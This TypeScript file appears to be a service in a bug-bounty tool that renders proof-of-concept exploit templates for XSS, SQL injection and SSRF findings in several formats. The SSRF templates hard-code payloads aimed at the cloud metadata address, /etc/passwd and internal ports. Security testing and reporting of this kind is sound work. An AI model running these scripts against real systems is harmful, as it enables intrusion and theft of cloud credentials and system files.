/**
 * PoC Generator Service
 * Generates proof-of-concept scripts, curl commands, and exploit code for findings
 */

import { URL } from 'url';
import { v4 as uuidv4 } from 'uuid';
import logger from '../utils/logger';
import database from './database';
import storage from './storage';

export interface Finding {
  id: string;
  title: string;
  type: string;
  severity: string;
  url: string;
  parameter?: string;
  payload?: string;
  evidence?: string;
  httpRequest?: string;
  httpResponse?: string;
  metadata?: Record<string, any>;
}

export interface PoCOutput {
  id: string;
  findingId: string;
  type: PoCType;
  language: string;
  code: string;
  description: string;
  instructions: string[];
  requirements?: string[];
  warnings?: string[];
  createdAt: Date;
}

export type PoCType =
  | 'curl'
  | 'python'
  | 'javascript'
  | 'bash'
  | 'burp'
  | 'nuclei'
  | 'html'
  | 'markdown';

// Templates for different vulnerability types
const POC_TEMPLATES: Record<string, Record<PoCType, string>> = {
  xss: {
    curl: `# XSS Proof of Concept
# Vulnerability: {{title}}
# URL: {{url}}
# Parameter: {{parameter}}

curl -X GET "{{url}}?{{parameter}}={{payload_encoded}}" \\
  -H "User-Agent: Mozilla/5.0" \\
  -H "Accept: text/html" \\
  -v

# Expected: Payload reflected in response without encoding`,

    python: `#!/usr/bin/env python3
"""
XSS Proof of Concept
Vulnerability: {{title}}
URL: {{url}}
"""

import requests
from urllib.parse import quote

TARGET_URL = "{{url}}"
PARAMETER = "{{parameter}}"
PAYLOAD = "{{payload}}"

def exploit():
    # Inject XSS payload
    params = {PARAMETER: PAYLOAD}
    
    response = requests.get(TARGET_URL, params=params)
    
    if PAYLOAD in response.text:
        print("[+] XSS vulnerability confirmed!")
        print(f"[+] Payload reflected in response")
        return True
    else:
        print("[-] Payload not reflected")
        return False

if __name__ == "__main__":
    exploit()
`,

    javascript: `// XSS Proof of Concept
// Vulnerability: {{title}}
// URL: {{url}}

const targetUrl = "{{url}}";
const parameter = "{{parameter}}";
const payload = "{{payload}}";

async function exploit() {
  const url = new URL(targetUrl);
  url.searchParams.set(parameter, payload);
  
  const response = await fetch(url.toString());
  const text = await response.text();
  
  if (text.includes(payload)) {
    console.log("[+] XSS vulnerability confirmed!");
    return true;
  }
  return false;
}

exploit();
`,

    bash: `#!/bin/bash
# XSS Proof of Concept
# Vulnerability: {{title}}

TARGET="{{url}}"
PARAM="{{parameter}}"
PAYLOAD="{{payload}}"

echo "[*] Testing XSS on $TARGET"
RESPONSE=$(curl -s "$TARGET?$PARAM=$PAYLOAD")

if echo "$RESPONSE" | grep -q "$PAYLOAD"; then
    echo "[+] XSS CONFIRMED - Payload reflected!"
else
    echo "[-] Payload not reflected"
fi
`,

    burp: `# Burp Suite Request
# Copy this to Repeater

GET {{path}}?{{parameter}}={{payload_encoded}} HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml
Connection: close

`,

    nuclei: `id: custom-xss-{{finding_id}}

info:
  name: {{title}}
  author: agenthunt
  severity: {{severity}}
  description: Custom XSS detection template
  tags: xss,custom

requests:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{parameter}}={{payload_encoded}}"
    
    matchers:
      - type: word
        words:
          - "{{payload}}"
        part: body
`,

    html: `<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - {{title}}</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <p><strong>Target:</strong> {{url}}</p>
    <p><strong>Parameter:</strong> {{parameter}}</p>
    <p><strong>Payload:</strong> <code>{{payload}}</code></p>
    
    <h2>Click to Test:</h2>
    <a href="{{url}}?{{parameter}}={{payload_encoded}}" target="_blank">
        Open Vulnerable URL
    </a>
    
    <h2>Iframe Demo:</h2>
    <iframe src="{{url}}?{{parameter}}={{payload_encoded}}" 
            width="800" height="400" 
            sandbox="allow-scripts">
    </iframe>
</body>
</html>
`,

    markdown: `# XSS Vulnerability Report

## Summary
- **Title:** {{title}}
- **Severity:** {{severity}}
- **Type:** Cross-Site Scripting (XSS)

## Affected Endpoint
- **URL:** \`{{url}}\`
- **Parameter:** \`{{parameter}}\`

## Payload
\`\`\`
{{payload}}
\`\`\`

## Steps to Reproduce
1. Navigate to: \`{{url}}\`
2. Inject the payload in the \`{{parameter}}\` parameter
3. Observe the payload execution in the browser

## Proof of Concept
\`\`\`bash
curl "{{url}}?{{parameter}}={{payload_encoded}}"
\`\`\`

## Impact
An attacker can execute arbitrary JavaScript in the context of the victim's browser session, potentially leading to:
- Session hijacking
- Credential theft
- Defacement
- Malware distribution

## Remediation
- Implement proper output encoding
- Use Content Security Policy (CSP)
- Validate and sanitize user input
`,
  },

  sqli: {
    curl: `# SQL Injection Proof of Concept
# Vulnerability: {{title}}
# URL: {{url}}

# Time-based detection
curl -X GET "{{url}}?{{parameter}}={{payload_encoded}}" \\
  -H "User-Agent: Mozilla/5.0" \\
  --connect-timeout 30 \\
  -w "\\nTime: %{time_total}s\\n" \\
  -o /dev/null

# If response time > 5s, SQLi confirmed`,

    python: `#!/usr/bin/env python3
"""
SQL Injection Proof of Concept
Vulnerability: {{title}}
URL: {{url}}
"""

import requests
import time
from urllib.parse import quote

TARGET_URL = "{{url}}"
PARAMETER = "{{parameter}}"
PAYLOAD = "{{payload}}"

def exploit():
    # Test time-based SQLi
    start = time.time()
    
    params = {PARAMETER: PAYLOAD}
    response = requests.get(TARGET_URL, params=params, timeout=30)
    
    elapsed = time.time() - start
    
    if elapsed > 5:
        print(f"[+] SQLi confirmed! Response time: {elapsed:.2f}s")
        return True
    else:
        print(f"[-] Response time: {elapsed:.2f}s")
        return False

if __name__ == "__main__":
    exploit()
`,

    javascript: `// SQL Injection PoC - Node.js
const https = require('https');

const targetUrl = "{{url}}";
const parameter = "{{parameter}}";
const payload = "{{payload}}";

async function exploit() {
  const start = Date.now();
  const url = new URL(targetUrl);
  url.searchParams.set(parameter, payload);
  
  await fetch(url.toString());
  const elapsed = (Date.now() - start) / 1000;
  
  console.log(\`Response time: \${elapsed}s\`);
  if (elapsed > 5) {
    console.log("[+] SQLi confirmed!");
  }
}

exploit();
`,

    bash: `#!/bin/bash
# SQLi Proof of Concept

TARGET="{{url}}"
PARAM="{{parameter}}"
PAYLOAD="{{payload_encoded}}"

echo "[*] Testing SQLi on $TARGET"
START=$(date +%s.%N)
curl -s "$TARGET?$PARAM=$PAYLOAD" -o /dev/null
END=$(date +%s.%N)
ELAPSED=$(echo "$END - $START" | bc)

echo "[*] Response time: ${ELAPSED}s"
if (( $(echo "$ELAPSED > 5" | bc -l) )); then
    echo "[+] SQLi CONFIRMED!"
fi
`,

    burp: `# Burp Suite SQLi Request

GET {{path}}?{{parameter}}={{payload_encoded}} HTTP/1.1
Host: {{host}}
User-Agent: sqlmap/1.7
Accept: */*
Connection: close

`,

    nuclei: `id: custom-sqli-{{finding_id}}

info:
  name: {{title}}
  author: agenthunt
  severity: {{severity}}
  tags: sqli,custom

requests:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{parameter}}={{payload_encoded}}"
    
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
`,

    html: `<!DOCTYPE html>
<html>
<head><title>SQLi PoC</title></head>
<body>
    <h1>SQL Injection PoC</h1>
    <p><strong>Target:</strong> {{url}}</p>
    <p><strong>Payload:</strong> <code>{{payload}}</code></p>
    <form action="{{url}}" method="GET">
        <input type="text" name="{{parameter}}" value="{{payload}}">
        <button type="submit">Test SQLi</button>
    </form>
</body>
</html>
`,

    markdown: `# SQL Injection Vulnerability Report

## Summary
- **Title:** {{title}}
- **Severity:** {{severity}}
- **Type:** SQL Injection

## Affected Endpoint
- **URL:** \`{{url}}\`
- **Parameter:** \`{{parameter}}\`

## Payload
\`\`\`sql
{{payload}}
\`\`\`

## Impact
- Database data exfiltration
- Authentication bypass
- Data modification/deletion
- Potential RCE via SQL features

## Remediation
- Use parameterized queries
- Implement input validation
- Apply least privilege to DB accounts
`,
  },

  ssrf: {
    curl: `# SSRF Proof of Concept
# Vulnerability: {{title}}

curl -X GET "{{url}}?{{parameter}}=http://169.254.169.254/latest/meta-data/" \\
  -H "User-Agent: Mozilla/5.0" \\
  -v

# Check for AWS metadata in response`,

    python: `#!/usr/bin/env python3
"""SSRF Proof of Concept"""

import requests

TARGET_URL = "{{url}}"
PARAMETER = "{{parameter}}"

# Test payloads
PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:22",
    "http://localhost:6379",
    "file:///etc/passwd",
]

def exploit():
    for payload in PAYLOADS:
        params = {PARAMETER: payload}
        response = requests.get(TARGET_URL, params=params)
        
        if response.status_code == 200 and len(response.text) > 0:
            print(f"[+] SSRF confirmed with: {payload}")
            print(f"[+] Response: {response.text[:200]}")

if __name__ == "__main__":
    exploit()
`,

    javascript: `// SSRF PoC
const targetUrl = "{{url}}";
const parameter = "{{parameter}}";

const payloads = [
  "http://169.254.169.254/latest/meta-data/",
  "http://127.0.0.1:22",
];

async function exploit() {
  for (const payload of payloads) {
    const url = new URL(targetUrl);
    url.searchParams.set(parameter, payload);
    const response = await fetch(url.toString());
    console.log(\`Testing: \${payload}\`);
    console.log(\`Status: \${response.status}\`);
  }
}

exploit();
`,

    bash: `#!/bin/bash
# SSRF PoC

TARGET="{{url}}"
PARAM="{{parameter}}"

PAYLOADS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://127.0.0.1:22"
    "file:///etc/passwd"
)

for payload in "\${PAYLOADS[@]}"; do
    echo "[*] Testing: $payload"
    curl -s "$TARGET?$PARAM=$payload" | head -c 500
    echo ""
done
`,

    burp: `GET {{path}}?{{parameter}}=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
`,

    nuclei: `id: custom-ssrf-{{finding_id}}

info:
  name: {{title}}
  author: agenthunt
  severity: {{severity}}
  tags: ssrf,custom

requests:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{parameter}}={{interactsh-url}}"
    
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
`,

    html: `<!DOCTYPE html>
<html>
<head><title>SSRF PoC</title></head>
<body>
    <h1>SSRF Proof of Concept</h1>
    <form action="{{url}}" method="GET">
        <label>Target URL:</label>
        <input type="text" name="{{parameter}}" value="http://169.254.169.254/latest/meta-data/" size="50">
        <button type="submit">Test SSRF</button>
    </form>
</body>
</html>
`,

    markdown: `# SSRF Vulnerability Report

## Summary
- **Title:** {{title}}
- **Severity:** {{severity}}
- **Type:** Server-Side Request Forgery

## Affected Endpoint
- **URL:** \`{{url}}\`
- **Parameter:** \`{{parameter}}\`

## Impact
- Access to internal services
- Cloud metadata exposure (AWS/GCP/Azure)
- Port scanning of internal network
- Potential RCE via internal services

## Remediation
- Whitelist allowed URLs/domains
- Block internal IP ranges
- Use URL validation libraries
`,
  },
};

class PoCGeneratorService {
  private static instance: PoCGeneratorService;

  private constructor() {}

  public static getInstance(): PoCGeneratorService {
    if (!PoCGeneratorService.instance) {
      PoCGeneratorService.instance = new PoCGeneratorService();
    }
    return PoCGeneratorService.instance;
  }

  /**
   * Generate PoC for a finding
   */
  public generatePoC(
    finding: Finding,
    type: PoCType = 'curl'
  ): PoCOutput {
    const vulnType = this.detectVulnerabilityType(finding);
    const template = POC_TEMPLATES[vulnType]?.[type] || this.getGenericTemplate(type);

    const code = this.renderTemplate(template, finding);

    return {
      id: uuidv4(),
      findingId: finding.id,
      type,
      language: this.getLanguage(type),
      code,
      description: `${type.toUpperCase()} PoC for ${finding.title}`,
      instructions: this.getInstructions(type, vulnType),
      requirements: this.getRequirements(type),
      warnings: this.getWarnings(vulnType),
      createdAt: new Date(),
    };
  }

  /**
   * Generate all PoC types for a finding
   */
  public generateAllPoCs(finding: Finding): PoCOutput[] {
    const types: PoCType[] = ['curl', 'python', 'bash', 'nuclei', 'markdown'];
    return types.map((type) => this.generatePoC(finding, type));
  }

  /**
   * Generate PoC and save to storage
   */
  public async generateAndSave(
    finding: Finding,
    programId: string,
    types: PoCType[] = ['curl', 'python', 'markdown']
  ): Promise<string[]> {
    const savedKeys: string[] = [];

    for (const type of types) {
      const poc = this.generatePoC(finding, type);
      const extension = this.getExtension(type);
      const key = storage.generateKey(
        programId,
        'poc',
        `${finding.id}-${type}.${extension}`
      );

      await storage.uploadText(key, poc.code);
      savedKeys.push(key);

      logger.info(
        { findingId: finding.id, type, key },
        'PoC generated and saved'
      );
    }

    return savedKeys;
  }

  /**
   * Generate a complete report package
   */
  public async generateReportPackage(
    finding: Finding,
    programId: string
  ): Promise<{
    markdown: string;
    pocs: PoCOutput[];
    zipKey?: string;
  }> {
    const pocs = this.generateAllPoCs(finding);
    const markdown = this.generatePoC(finding, 'markdown').code;

    // Save all PoCs
    await this.generateAndSave(finding, programId, ['curl', 'python', 'bash', 'nuclei', 'html']);

    return {
      markdown,
      pocs,
    };
  }

  // ============ Private Methods ============

  private detectVulnerabilityType(finding: Finding): string {
    const title = finding.title.toLowerCase();
    const type = finding.type.toLowerCase();

    if (title.includes('xss') || type.includes('xss') || title.includes('cross-site scripting')) {
      return 'xss';
    }
    if (title.includes('sql') || type.includes('sqli') || title.includes('injection')) {
      return 'sqli';
    }
    if (title.includes('ssrf') || type.includes('ssrf') || title.includes('server-side request')) {
      return 'ssrf';
    }
    if (title.includes('redirect') || type.includes('redirect')) {
      return 'redirect';
    }
    if (title.includes('csrf') || type.includes('csrf')) {
      return 'csrf';
    }

    return 'generic';
  }

  private renderTemplate(template: string, finding: Finding): string {
    const url = new URL(finding.url);

    const replacements: Record<string, string> = {
      '{{title}}': finding.title,
      '{{url}}': finding.url,
      '{{host}}': url.host,
      '{{path}}': url.pathname + url.search,
      '{{parameter}}': finding.parameter || 'param',
      '{{payload}}': finding.payload || '',
      '{{payload_encoded}}': encodeURIComponent(finding.payload || ''),
      '{{severity}}': finding.severity,
      '{{finding_id}}': finding.id.substring(0, 8),
      '{{evidence}}': finding.evidence || '',
    };

    let result = template;
    for (const [key, value] of Object.entries(replacements)) {
      result = result.replace(new RegExp(key.replace(/[{}]/g, '\\$&'), 'g'), value);
    }

    return result;
  }

  private getGenericTemplate(type: PoCType): string {
    const templates: Record<PoCType, string> = {
      curl: `# Generic PoC
curl -X GET "{{url}}" -v`,
      python: `#!/usr/bin/env python3
import requests
response = requests.get("{{url}}")
print(response.text)`,
      javascript: `fetch("{{url}}").then(r => r.text()).then(console.log)`,
      bash: `#!/bin/bash
curl -s "{{url}}"`,
      burp: `GET {{path}} HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0`,
      nuclei: `id: custom-{{finding_id}}
info:
  name: {{title}}
  severity: {{severity}}
requests:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}"`,
      html: `<a href="{{url}}" target="_blank">Test Link</a>`,
      markdown: `# {{title}}
**URL:** {{url}}
**Severity:** {{severity}}`,
    };

    return templates[type];
  }

  private getLanguage(type: PoCType): string {
    const languages: Record<PoCType, string> = {
      curl: 'bash',
      python: 'python',
      javascript: 'javascript',
      bash: 'bash',
      burp: 'http',
      nuclei: 'yaml',
      html: 'html',
      markdown: 'markdown',
    };
    return languages[type];
  }

  private getExtension(type: PoCType): string {
    const extensions: Record<PoCType, string> = {
      curl: 'sh',
      python: 'py',
      javascript: 'js',
      bash: 'sh',
      burp: 'txt',
      nuclei: 'yaml',
      html: 'html',
      markdown: 'md',
    };
    return extensions[type];
  }

  private getInstructions(type: PoCType, vulnType: string): string[] {
    const baseInstructions: Record<PoCType, string[]> = {
      curl: ['Run the curl command in terminal', 'Check response for vulnerability indicators'],
      python: ['Install requests: pip install requests', 'Run: python3 poc.py'],
      javascript: ['Run in Node.js or browser console'],
      bash: ['Make executable: chmod +x poc.sh', 'Run: ./poc.sh'],
      burp: ['Copy to Burp Repeater', 'Send request and analyze response'],
      nuclei: ['Save as template.yaml', 'Run: nuclei -t template.yaml -u target'],
      html: ['Open in browser', 'Click the test link'],
      markdown: ['Use for bug bounty report submission'],
    };

    return baseInstructions[type] || ['Follow standard execution steps'];
  }

  private getRequirements(type: PoCType): string[] {
    const requirements: Record<PoCType, string[]> = {
      curl: ['curl'],
      python: ['Python 3.x', 'requests library'],
      javascript: ['Node.js or modern browser'],
      bash: ['Bash shell', 'curl'],
      burp: ['Burp Suite'],
      nuclei: ['Nuclei scanner'],
      html: ['Web browser'],
      markdown: [],
    };
    return requirements[type] || [];
  }

  private getWarnings(vulnType: string): string[] {
    const warnings: Record<string, string[]> = {
      xss: ['Do not test on production systems without authorization'],
      sqli: [
        'SQL injection can cause data loss',
        'Only test on authorized systems',
        'Be careful with DELETE/DROP payloads',
      ],
      ssrf: [
        'SSRF can access internal systems',
        'Do not exfiltrate sensitive data',
        'Report findings responsibly',
      ],
      generic: ['Only test on authorized systems'],
    };

    return warnings[vulnType] || warnings.generic;
  }
}

export default PoCGeneratorService.getInstance();
